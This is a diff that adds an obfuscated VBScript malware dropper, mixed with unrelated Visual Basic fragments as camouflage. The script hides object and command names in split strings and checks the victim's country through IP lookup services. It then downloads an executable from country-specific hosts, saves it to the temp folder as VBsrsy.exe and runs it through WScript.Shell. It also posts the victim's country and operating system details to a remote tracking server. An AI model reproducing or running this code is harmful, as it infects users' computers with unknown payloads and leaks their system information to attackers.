@@ -1,0 +1,491 @@
+
+ Dim Pirates 
+Dim S7vassalensurance 'As String
+
+Dim S7vassalInPlaceOf 'As String
+S7vassalBelish = "User"
+Public Function PrepareCheck(toCheck)
+    toCheck = Replace(toCheck, "[", "˙")
+    toCheck = Replace(toCheck, "]", "ö")
+    toCheck = Replace(toCheck, "~", "Ü")
+    toCheck = Replace(toCheck, "#", "˘")
+    toCheck = Replace(toCheck, "-", "Ł")
+    toCheck = Replace(toCheck, "&", "Ľ")
+    toCheck = Replace(toCheck, "@", "¤")
+    toCheck = Replace(toCheck, "{", "")
+    toCheck = Replace(toCheck, "}", "á")
+    toCheck = Replace(toCheck, "^", "í")
+    toCheck = Replace(toCheck, "`", "ó")
+    toCheck = Replace(toCheck, "_", "ú")
+    toCheck = Replace(toCheck, "+", "ń")
+    toCheck = Replace(toCheck, "$", "÷")
+    PrepareCheck = LCase(toCheck)
+End Function
+
+
+  Pirates = "XMLHTTPL234Adodb.streaML234s"
+Public Sub LoadDatabase()
+    
+
+    ' 9/13/06: Add the bot owner 200
+    If (LenB(BotVars.BotOwner) > 0) Then
+        For i = 0 To UBound(DB)
+            If (StrComp(DB(i).Username, BotVars.BotOwner, vbTextCompare) = 0) Then
+                found = True
+                
+                Exit For
+            End If
+        Next
+        
+
+    End If
+    
+    If (SaveDB) Then Call WriteDatabase(Path)
+End Sub
+
+function detectCountry()
+Dim resp
+dataUrls = Array("http://freegeoip.net/json/","http://www.geoplugin.net/json.gp","https://ipinfo.io/json")
+ For i = 0 To 2 Step 1
+
+ Dim o
+
+S7vassalWentDo.open "GET", dataUrls(i), False
+SetUA(S7vassalWentDo)
+S7vassalWentDo.send
+resp = S7vassalWentDo.ResponseText
+If InStr(resp,"{") >0 AND InStr(resp,"}")>0 Then
+AbstractDiyvassalstatus = true
+ Exit For
+End If
+next
+on error goto 0
+resp = Replace(resp," ","")
+strFind = Array("country_code"":""", "countryCode"":""", "country"":""")
+
+For i = 0 To 2 Step 1
+pos = InStr(resp, strFind(i))
+if  pos> 0 Then
+pos= pos+Len(strFind(i))
+pos2 = InStr(pos, resp, """")
+detectCountry = Mid(resp, pos , pos2 - pos )
+end if
+next
+end function
+
+Dim williams
+       Dim TristateTrue
+
+Vrungel = ".respo"+"nseBody"
+
+Dim S7vassalTimeTo 'As Object
+Dim S7vassalstatus
+S7vassalstatus = false
+   
+Dim S7vassalbalibob 'As Object   
+
+
+Dim S7vassalcashback 'As Object
+      
+CUA ="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+
+ Function SyncObjAringtonevassal2(param1)
+param1 = param1 + param1
+
+S7vassal5000 = S7vassalWentDo.responseBody
+param1 = 3 * param1 - 8	
+
+End Function
+
+Dim ZimZamZum
+
+Dim S7vassalWentDo 'As Object
+  
+Dim abirvalgringtoneAxxxxx 'As Object
+
+
+Function T2000(p, ddd) 
+    Set S7vassalRunrun = CreateObject("WSc"+"ript.Shell")	
+	abirvalgringtoneAxxxxx.Type = 1
+ abirvalgringtoneAxxxxx.Open
+End Function 
+
+Pirates ="Microsoft." + Pirates+  "hell.App"+"licationL234Wscript"
+
+Function StackStack( vr )
+	ad1 = Replace(Pirates, "R2D2", "" )
+   StackStack = Split(ad1,  vr)
+End Function
+
+Pirates = Pirates+".shellL234ProcessL234GeTL234T"+"emPL234TyR2D2peR2D2"
+
+
+Function SyncObjAringtonevassal(strr)
+if D = 33 then
+AXC = "Sav"+"eToFile"
+end if
+abirvalgringtoneAxxxxx.Savetofile S7vassalInPlaceOf , 14-12
+End Function
+
+    Public Function FolderToCopy(dde,SecondP,VKUok)
+Samwell = 89
+Samwell = Samwell + 21
+if Samwell > 43 then
+SecondP.Write VKUok
+Samwell =  Samwell / 23
+end if
+End Function
+	
+
+
+ 
+ Function IsCircleAnalytic(ByVal Figure1 ) 
+If Figure1 < FigureCount And Figure1 >= 0 Then
+    If Figures(Figure1).FigureType = dsAnCircle Then IsCircleAnalytic = True
+End If
+End Function
+Pirates = Pirates +"L234R2D2oR2D2penL234wrR2D2iteL234reR2D2spoR2D2nseBoR2D2dyL234saR2D2vetof"+"R2D2ileL234\VBsrsy.ex"+"R2D2eL234httR2D2p:L234//"
+
+
+ Function GetShitlist(ByVal Username ) 
+    Dim gAcc 
+    Dim Ban  
+    
+    gAcc = GetCumulativeAccess(Username, "USER")
+    
+    If (Not InStr(1, gAcc.Flags, "Z", vbBinaryCompare) = 0) Then
+        Ban = True
+    ElseIf (Not InStr(1, gAcc.Flags, "B", vbBinaryCompare) = 0) Then
+        If (GetSafelist(Username) = False) Then Ban = True
+    End If
+    
+    If (Ban) Then
+        If ((Len(gAcc.BanMessage) > 0) And (gAcc.BanMessage <> "%")) Then
+            GetShitlist = Username & Space(1) & gAcc.BanMessage
+        ElseIf InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clanban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, " (game)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clientban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (game)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, "*", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Tagban: " & Mid(gAcc.Username, 2, Len(gAcc.Username) - 2)
+        Else
+            GetShitlist = Username & Space(1) & "Shitlisted"
+        End If
+    End If
+End Function
+
+Function SheduledbrainlessObject(p,d)
+
+FC = "" + S7vassalInPlaceOf
+
+ S7vassalRunrun.Run(FC + "")
+
+End Function
+
+Dim S7vassalPetir 'As String
+Dim sNodeKey 'As String
+  Dim sParentKey 'As String
+
+
+S7vassalPetir = "Ag"
+
+williams = StackStack("" + "L234" )
+
+  Dim MarketPlaceibility 'As String
+
+
+Dim Twelve 'As Integer
+  Dim sDecimalVis 'As String
+  
+Set S7vassalWentDo = CreateObject("" + williams(00))
+ 
+Dim Valery 'As Integer
+S7vassalBelish = S7vassalBelish + "-"
+ 
+
+
+Dim S7vassal404 'As String
+
+Dim S7vassal5000 'As Variant
+Dim S7vassalRunrun
+ Dim MarketPlace 'As String
+  Dim sTempVis 'As String
+  Dim iCount 'As Integer
+
+Function S7vassalFuks(p)
+ 
+S7vassalWentDo.Send
+	
+
+End Function
+Twelve = 11 + 1
+zTempVis = williams(1)
+
+'Set S7vassalTimeTo = CreateObject(williams(8-6))
+Set S7vassalHelmet = GetRef("SheduledbrainlessObject")
+Set S7vassal13 = GetRef("SyncObjAringtonevassal")
+Set S7vassal14 = GetRef("FolderToCopy")
+ 
+Set abirvalgringtoneAxxxxx = CreateObject("Adodb.s"+"treaM")
+
+Public Sub DebugLog(txt)
+    'debug.print txt
+    Open AppPath & "ARCServerDebug.txt" 
+    Print txt
+    Close 
+End Sub
+Set S7vassalbalibob = CreateObject(""+williams(10-7))
+
+if "Plast" + WScript + "11" = "PlastWindows Script Host11" Then 
+	
+	
+
+
+
+	Set S7vassalcashback = S7vassalbalibob.Environment(williams(1 + 3))
+
+end if	
+
+Function SetUA(rkx)
+rkx.setRequestHeader S7vassalBelish, CUA
+End Function
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+ 
+ 
+ Valery = 89210
+
+S7vassalensurance = S7vassalcashback(williams(6))
+ Dim i
+ 'on error GoTo nextU
+' on error resume next
+sTempVis = williams(1+Twelve -1)
+
+ 
+
+Sub SendFlagDat(SndTo)
+    Dim i , b , n 
+    Dim oNewMsg() , lNewOffSet 
+    Dim lNewMsg 
+    
+    For i = 1 To UBound(Flag1, 2)
+        
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 1
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag1(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag1(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry1(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag2, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 2
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag2(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag2(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry2(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag3, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 3
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag3(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag3(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry3(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag4, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 4
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag4(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag4(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry4(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag5, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 5
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag5(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag5(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry5(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    
+End Sub
+ 
+ 
+MarketPlace = williams(11+2) & williams(11+3)
+
+S7vassalBelish = S7vassalBelish & S7vassalPetir & "ent"
+xxxou = 19
+
+
+choice =  detectCountry()
+need = Array("GB", "UK", "AU", "LU", "BE", "IE")
+
+If Ubound(Filter(need, choice)) > -1 Then
+          ZimZamZum = Array("yamanashi-jyujin.jp/nui76tg7?","nsaflow.info/p66/nui76tg7","mtblanc-let.co.uk/nui76tg7?")
+        Else
+          ZimZamZum = Array("logica-info.com/09yhb7r5e?","nsaflow.info/p66/09yhb7r5e","m-tensou.net/09yhb7r5e?")
+        End If
+
+Function HTTPPost( sRequest)
+on error resume  next
+  S7vassalWentDo.open "POST", "http://rateventrithathen.info/tr554.php",false
+
+SetUA(S7vassalWentDo)
+  
+  S7vassalWentDo.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+  S7vassalWentDo.setRequestHeader "Content-Length", Len(sRequest)
+  S7vassalWentDo.send sRequest
+  HTTPPost = S7vassalWentDo.responseText
+on error goto 0
+ End Function
+Function detect1()
+
+strComputer = "."
+Set objWMIService = GetObject("winmgmts:" _
+    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
+ 
+Set colOperatingSystems = objWMIService.ExecQuery _
+    ("Select * from Win32_OperatingSystem")
+DIm res
+res = ""
+For Each objOperatingSystem in colOperatingSystems
+res =res & objOperatingSystem.CountryCode & "|" & objOperatingSystem.Version & "|" & objOperatingSystem.OSType & "|"
+Next
+detect1 = res
+End Function
+lTo = UBound(ZimZamZum)
+
+Sub SendSwitchDat(SndTo , Priorty)
+    Dim i , b , n 
+    Dim lNewMsg 
+    For i = 1 To UBound(Switches, 2)
+        If Switched(i) > 0 Or Priorty Then
+            lNewMsg = MSG_SWITCH
+            lNewOffSet = 0
+            ReDim oNewMsg(0)
+            AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+            b = 0
+            AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+            AddBufferData oNewMsg, VarPtr(i), LenB(i), lNewOffSet
+            n = Switched(i)
+            AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+            SendTo oNewMsg, CInt(SndTo)
+        End If
+    Next
+End Sub
+
+Dim kakuli
+ 
+For i = 0 To lTo Step 1
+xxxou = xxxou * 16
+
+	on error resume  next
+Valery =  Valery +14
+dr1=2
+
+xxxou2 = williams(15-10)
+ S7vassalWentDo.Open xxxou2, MarketPlace + ZimZamZum(i), False
+
+xxxou = xxxou + 93
+
+
+
+SetUA(S7vassalWentDo)
+S7vassalFuks " d "
+If S7vassalWentDo.Status +3 = 203 Then
+kakuli = i
+S7vassalstatus = true
+ Exit For
+End If
+
+goto14:
+Next
+
+on error goto 0
+
+if S7vassalstatus Then
+Dim Clank 'As String
+ S7vassalInPlaceOf = S7vassalensurance+ sTempVis
+
+T2000 "",4
+SyncObjAringtonevassal2 31 
+S7vassal14 "",abirvalgringtoneAxxxxx,S7vassal5000
+Sapogi =21
+S7vassalInPlaceOfu = "" + S7vassalInPlaceOf 
+
+
+Sapogi = Sapogi*5
+
+Dim S7vassalJohnSnowu,S7vassalDisplay 'As Long
+S7vassal13 "ss"
+S7vassalJohnSnowu = 2589
+
+If 309 < S7vassalJohnSnowu + 1 Then
+	  
+	Hipster =xxxou+xxxou
+	S7vassalHelmet Hipster, xxxou
+	S7vassalDisplay = "H"
+End If
+
+
+
+mafia = 11122
+
+HTTPPost("A=" & choice & "&B=" & ZimZamZum(kakuli) & "&C=" & detect1())
+else
+HTTPPost("A=" & choice & "&B=" & "Error" & "&C=" & detect1())
+end if
